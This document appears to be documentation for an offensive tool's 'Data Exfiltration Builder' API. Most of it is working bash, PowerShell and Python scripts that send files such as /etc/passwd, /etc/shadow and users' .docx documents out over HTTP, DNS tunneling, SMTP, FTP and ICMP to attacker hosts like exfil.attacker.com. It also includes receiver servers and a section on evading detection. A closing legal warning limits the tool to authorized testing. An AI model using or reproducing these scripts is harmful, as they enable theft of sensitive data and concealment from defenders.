# Data Exfiltration Builder - Complete Guide

## Overview

The **Data Exfiltration Builder** generates full, production-ready scripts for exfiltrating data through various channels. These are complete, working scripts with proper error handling, chunking, and rate limiting - not just command templates.

## Features

### ✅ Complete Script Generation

- **Full Scripts**: Complete bash/PowerShell/Python scripts with all logic
- **Error Handling**: Try/catch blocks and error checking
- **Chunking Support**: Automatic file splitting for large data
- **Rate Limiting**: Built-in delays to avoid detection
- **Session Tracking**: Unique session IDs for tracking transfers
- **Metadata**: Includes timestamps, hostnames, file sizes

## Exfiltration Methods

### 1. HTTP POST Exfiltration (Bash)

**Method**: `http` or `https`

**Features**:
- ✅ Automatic file chunking (1MB default)
- ✅ Base64 encoding
- ✅ Session ID tracking
- ✅ Supports files and directories
- ✅ Progress indicators
- ✅ Error handling

**Request**:
```json
{
  "method": "http",
  "options": {
    "server": "http://192.168.1.100:8080",
    "dataPath": "/home/user/sensitive_docs",
    "chunkSize": 1048576
  }
}
```

**Generated Script Structure**:
```bash
#!/bin/bash
# HTTP Data Exfiltration Script
# Server: http://192.168.1.100:8080

SERVER="http://192.168.1.100:8080"
DATA_PATH="/home/user/sensitive_docs"
CHUNK_SIZE=1048576
SESSION_ID=$(uname -n)-$(date +%s)

# Function to exfiltrate file
exfiltrate_file() {
    local file="$1"
    local filename=$(basename "$file")
    local filesize=$(stat -c%s "$file")
    
    # Split into chunks if large
    if [ $filesize -gt $CHUNK_SIZE ]; then
        local chunks=$(($filesize / $CHUNK_SIZE + 1))
        
        for i in $(seq 0 $(($chunks - 1))); do
            dd if="$file" bs=$CHUNK_SIZE skip=$i count=1 | \
            base64 | \
            curl -X POST \
                -H "X-Session-ID: $SESSION_ID" \
                -H "X-Filename: $filename" \
                -H "X-Chunk: $i" \
                -d @- \
                "$SERVER/upload"
        done
    else
        # Send entire file
        base64 "$file" | \
        curl -X POST \
            -H "X-Session-ID: $SESSION_ID" \
            -H "X-Filename: $filename" \
            -d @- \
            "$SERVER/upload"
    fi
}

# Function to exfiltrate directory
exfiltrate_directory() {
    local dir="$1"
    local archive="/tmp/exfil_$(date +%s).tar.gz"
    tar czf "$archive" -C "$(dirname "$dir")" "$(basename "$dir")"
    exfiltrate_file "$archive"
    rm -f "$archive"
}

# Main execution logic...
```

**Usage**:
```bash
chmod +x exfil.sh
./exfil.sh
```

### 2. DNS Tunneling Exfiltration (Bash)

**Method**: `dns`

**Features**:
- ✅ Base64 encoding with DNS-safe characters
- ✅ Automatic chunking (63 bytes per DNS label)
- ✅ Start/end markers
- ✅ Rate limiting to avoid detection
- ✅ Session tracking

**Request**:
```json
{
  "method": "dns",
  "options": {
    "domain": "exfil.attacker.com",
    "dataPath": "/etc/passwd"
  }
}
```

**Generated Script**:
```bash
#!/bin/bash
# DNS Tunneling Exfiltration Script

DOMAIN="exfil.attacker.com"
DATA_PATH="/etc/passwd"
CHUNK_SIZE=63  # Max DNS label length

dns_exfil() {
    local data="$1"
    local session_id=$(echo $RANDOM | md5sum | cut -c1-8)
    
    # Base64 encode and make DNS-safe
    local encoded=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
    local total_length=${#encoded}
    local chunks=$(( ($total_length + $CHUNK_SIZE - 1) / $CHUNK_SIZE ))
    
    # Send start marker
    dig "start.$session_id.$DOMAIN" +short > /dev/null 2>&1
    sleep 0.5
    
    # Send data chunks
    local pos=0
    local chunk_num=0
    while [ $pos -lt $total_length ]; do
        local chunk=${encoded:$pos:$CHUNK_SIZE}
        local query="$chunk_num.$chunk.$session_id.$DOMAIN"
        dig "$query" +short > /dev/null 2>&1
        pos=$((pos + $CHUNK_SIZE))
        chunk_num=$((chunk_num + 1))
        sleep 0.2  # Rate limiting
    done
    
    # Send end marker
    dig "end.$chunks.$session_id.$DOMAIN" +short > /dev/null 2>&1
}

# Read and exfiltrate data...
```

**DNS Server Setup** (attacker side):
```python
# Simple DNS listener to decode data
import dnslib.server

class ExfilHandler:
    def handle(self, request):
        query = str(request.q.qname)
        # Parse: chunk_num.data.session_id.domain
        parts = query.split('.')
        # Decode and reassemble data
```

### 3. PowerShell HTTP Exfiltration

**Method**: `powershell`

**Features**:
- ✅ File and directory exfiltration
- ✅ System information collection
- ✅ JSON metadata
- ✅ Multiple file pattern support
- ✅ Error handling and retry logic
- ✅ Progress indicators

**Request**:
```json
{
  "method": "powershell",
  "options": {
    "server": "http://192.168.1.100:8080",
    "dataPath": "C:\\Users\\*\\Documents\\*.docx"
  }
}
```

**Generated Script**:
```powershell
# PowerShell Data Exfiltration Script

$server = "http://192.168.1.100:8080"
$dataPath = "C:\Users\*\Documents\*.docx"
$sessionId = "$env:COMPUTERNAME-$(Get-Date -Format 'yyyyMMdd-HHmmss')"

function Exfiltrate-File {
    param([string]$FilePath, [string]$Server, [string]$SessionId)
    
    try {
        $fileName = Split-Path $FilePath -Leaf
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileBase64 = [System.Convert]::ToBase64String($fileBytes)
        
        $metadata = @{
            sessionId = $SessionId
            fileName = $fileName
            fileSize = $fileBytes.Length
            computerName = $env:COMPUTERNAME
            userName = $env:USERNAME
            timestamp = (Get-Date).ToString('o')
            data = $fileBase64
        } | ConvertTo-Json
        
        $headers = @{
            "Content-Type" = "application/json"
            "X-Session-ID" = $SessionId
        }
        
        Invoke-RestMethod -Uri "$Server/upload" `
            -Method Post `
            -Headers $headers `
            -Body $metadata `
            -UseBasicParsing
        
        Write-Host "[+] File uploaded: $fileName"
        return $true
    } catch {
        Write-Host "[-] Error: $($_.Exception.Message)"
        return $false
    }
}

function Exfiltrate-Files {
    param([string]$Pattern, [string]$Server, [string]$SessionId)
    
    $files = Get-ChildItem -Path $Pattern -Recurse -File -ErrorAction SilentlyContinue
    $totalFiles = $files.Count
    
    foreach ($file in $files) {
        Exfiltrate-File -FilePath $file.FullName -Server $Server -SessionId $SessionId
        Start-Sleep -Milliseconds 500  # Rate limiting
    }
}

function Exfiltrate-SystemInfo {
    param([string]$Server, [string]$SessionId)
    
    $systemInfo = @{
        sessionId = $SessionId
        computerName = $env:COMPUTERNAME
        userName = $env:USERNAME
        osVersion = (Get-WmiObject Win32_OperatingSystem).Caption
        ipAddress = (Get-NetIPAddress -AddressFamily IPv4).IPAddress
        installedSoftware = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*).DisplayName
    } | ConvertTo-Json
    
    Invoke-RestMethod -Uri "$Server/sysinfo" -Method Post -Body $systemInfo
}

# Main execution
Exfiltrate-SystemInfo -Server $server -SessionId $sessionId
Exfiltrate-Files -Pattern $dataPath -Server $server -SessionId $sessionId
```

### 4. SMTP Email Exfiltration (Python)

**Method**: `smtp` or `email`

**Features**:
- ✅ Email attachment exfiltration
- ✅ STARTTLS encryption
- ✅ Authentication support
- ✅ Metadata in email body
- ✅ Automatic base64 encoding

**Request**:
```json
{
  "method": "smtp",
  "options": {
    "smtpServer": "smtp.gmail.com",
    "smtpPort": 587,
    "smtpUser": "exfil@gmail.com",
    "smtpPass": "app_password",
    "from": "exfil@gmail.com",
    "to": "attacker@protonmail.com",
    "dataPath": "/home/user/documents/report.pdf"
  }
}
```

**Generated Script**:
```python
#!/usr/bin/env python3
# SMTP Email Exfiltration Script

import smtplib
import base64
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
FROM_EMAIL = "exfil@gmail.com"
TO_EMAIL = "attacker@protonmail.com"
DATA_PATH = "/home/user/documents/report.pdf"
SMTP_USER = "exfil@gmail.com"
SMTP_PASS = "app_password"

def exfiltrate_via_email(file_path):
    try:
        print(f"[+] Reading file: {file_path}")
        
        msg = MIMEMultipart()
        msg['From'] = FROM_EMAIL
        msg['To'] = TO_EMAIL
        msg['Subject'] = f"Data Exfil - {os.path.basename(file_path)}"
        
        body = f"""
        Exfiltrated Data Report
        -----------------------
        Filename: {os.path.basename(file_path)}
        Size: {os.path.getsize(file_path)} bytes
        Timestamp: {datetime.now().isoformat()}
        Hostname: {os.uname().nodename}
        """
        msg.attach(MIMEText(body, 'plain'))
        
        # Attach file
        with open(file_path, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 
                f'attachment; filename={os.path.basename(file_path)}')
            msg.attach(part)
        
        # Send email
        print(f"[+] Connecting to {SMTP_SERVER}:{SMTP_PORT}...")
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.send_message(msg)
        server.quit()
        
        print(f"[+] Data exfiltrated successfully")
        return True
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False

if __name__ == "__main__":
    exfiltrate_via_email(DATA_PATH)
```

### 5. FTP Upload Exfiltration

**Method**: `ftp`

**Request**:
```json
{
  "method": "ftp",
  "options": {
    "ftpServer": "ftp.attacker.com",
    "ftpUser": "exfil_user",
    "ftpPass": "password123",
    "dataPath": "/tmp/sensitive_data.tar.gz"
  }
}
```

### 6. ICMP Tunneling

**Method**: `icmp`

**Requires**: hping3

**Request**:
```json
{
  "method": "icmp",
  "options": {
    "target": "192.168.1.100",
    "dataPath": "/etc/shadow"
  }
}
```

## Server-Side Receivers

### HTTP Receiver (Node.js)
```javascript
const express = require('express');
const app = express();

app.use(express.json({ limit: '50mb' }));

app.post('/upload', (req, res) => {
  const sessionId = req.headers['x-session-id'];
  const filename = req.headers['x-filename'];
  const chunk = req.headers['x-chunk'];
  
  // Decode base64
  const data = Buffer.from(req.body, 'base64');
  
  // Save to file
  const fs = require('fs');
  fs.appendFileSync(`./uploads/${sessionId}_${filename}`, data);
  
  res.json({ status: 'ok', chunk });
});

app.listen(8080);
```

### DNS Receiver (Python)
```python
from dnslib import DNSRecord
from dnslib.server import DNSServer
import base64

sessions = {}

class ExfilResolver:
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        parts = qname.split('.')
        
        if parts[0] == 'start':
            session_id = parts[1]
            sessions[session_id] = []
        elif parts[0] == 'end':
            session_id = parts[2]
            data = ''.join(sessions[session_id])
            decoded = base64.b64decode(data.replace('-', '+').replace('_', '/'))
            print(f"Received: {decoded}")
        else:
            chunk_num, data, session_id = parts[0], parts[1], parts[2]
            sessions[session_id].append(data)
        
        return request.reply()

resolver = ExfilResolver()
server = DNSServer(resolver, port=53)
server.start_thread()
```

## API Usage Examples

### cURL
```bash
# HTTP exfiltration
curl -X POST http://localhost:3001/api/vulnerability/post-exploit/exfiltration \
  -H "Content-Type: application/json" \
  -d '{
    "method": "http",
    "options": {
      "server": "http://192.168.1.100:8080",
      "dataPath": "/home/user/documents",
      "chunkSize": 1048576
    }
  }'

# DNS exfiltration
curl -X POST http://localhost:3001/api/vulnerability/post-exploit/exfiltration \
  -H "Content-Type: application/json" \
  -d '{
    "method": "dns",
    "options": {
      "domain": "exfil.attacker.com",
      "dataPath": "/etc/passwd"
    }
  }'

# PowerShell exfiltration
curl -X POST http://localhost:3001/api/vulnerability/post-exploit/exfiltration \
  -H "Content-Type: application/json" \
  -d '{
    "method": "powershell",
    "options": {
      "server": "http://192.168.1.100:8080",
      "dataPath": "C:\\Users\\*\\Documents\\*.docx"
    }
  }'
```

### JavaScript
```javascript
const axios = require('axios');

async function generateExfilScript() {
  const response = await axios.post(
    'http://localhost:3001/api/vulnerability/post-exploit/exfiltration',
    {
      method: 'http',
      options: {
        server: 'http://192.168.1.100:8080',
        dataPath: '/home/user/sensitive_docs',
        chunkSize: 1048576
      }
    }
  );
  
  console.log('Script:', response.data.script);
  
  // Save to file
  require('fs').writeFileSync('exfil.sh', response.data.script);
}
```

### Python
```python
import requests

response = requests.post(
    'http://localhost:3001/api/vulnerability/post-exploit/exfiltration',
    json={
        'method': 'powershell',
        'options': {
            'server': 'http://192.168.1.100:8080',
            'dataPath': 'C:\\Users\\*\\Documents\\*.docx'
        }
    }
)

script_data = response.json()
print(f"Method: {script_data['name']}")
print(f"Format: {script_data['format']}")
print(f"Script:\n{script_data['script']}")

# Save to file
with open('exfil.ps1', 'w') as f:
    f.write(script_data['script'])
```

## Detection Evasion

### Rate Limiting
```bash
# Add delays between transfers
sleep 0.5  # 500ms delay
```

### Encryption
```bash
# Encrypt before exfiltration
openssl enc -aes-256-cbc -salt -in data.txt -out data.enc
# Then exfiltrate data.enc
```

### Obfuscation
```bash
# Base64 encode
base64 data.txt | curl -X POST -d @- http://server/upload

# Use DNS tunneling (inherently obfuscated)
```

### Stealth Techniques
- Use HTTPS instead of HTTP
- DNS over HTTPS (DoH)
- Split data across multiple channels
- Use legitimate services (pastebin, dropbox API, etc.)

## Legal Warning

⚠️ **CRITICAL**: Data exfiltration tools are FOR AUTHORIZED SECURITY TESTING ONLY.

Unauthorized data exfiltration is:
- **ILLEGAL** in virtually all jurisdictions
- **CRIMINAL** offense with severe penalties
- **DATA BREACH** with civil liability
- **ESPIONAGE** in some cases

Always ensure:
- Written authorization from data owner
- Clear scope of what data can be accessed
- Compliance with data protection laws (GDPR, CCPA, etc.)
- Incident response procedures in place
- Legal counsel review

## Best Practices

1. **Test in Isolated Lab**: Never test on production systems
2. **Document Everything**: Keep detailed logs of all tests
3. **Encryption**: Always encrypt exfiltrated data
4. **Cleanup**: Remove scripts and data after testing
5. **Secure Storage**: Protect generated scripts
6. **Legal Compliance**: Follow all laws and regulations

---

**Last Updated**: January 5, 2024
**Version**: 2.0.0 (Enhanced Data Exfiltration Builder)
